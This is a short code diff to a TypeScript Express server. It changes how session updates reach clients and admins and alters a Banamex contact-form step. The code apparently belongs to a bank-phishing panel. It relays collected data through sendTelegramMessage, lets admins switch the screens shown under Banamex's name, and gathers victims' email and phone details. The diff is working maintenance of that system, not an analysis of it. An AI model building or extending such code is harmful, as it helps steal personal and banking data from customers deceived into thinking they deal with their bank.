@@ -856,10 +856,16 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
       await sendTelegramMessage(telegramMessage);
 
-      broadcastToAdmins(JSON.stringify({
+      const updateMessage = JSON.stringify({
         type: 'SESSION_UPDATE',
         data: session
-      }));
+      });
+
+      // Enviar al cliente específico
+      sendToClient(sessionId, updateMessage);
+
+      // También enviar a admins
+      broadcastToAdmins(updateMessage);
 
       // Después de 2 segundos, cambiar automáticamente a BANAMEX_CONTACT_FORM
       setTimeout(async () => {
@@ -924,7 +930,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         correoContacto,
         celularContacto,
         telefonoAlternativoContacto: telefonoAlternativoContacto || '',
-        pasoActual: ScreenType.BANAMEX_WAITING,
+        pasoActual: ScreenType.VALIDANDO,
       });
 
       console.log(`[Banamex Contact] Formulario de contacto recibido - Session: ${sessionId}`);
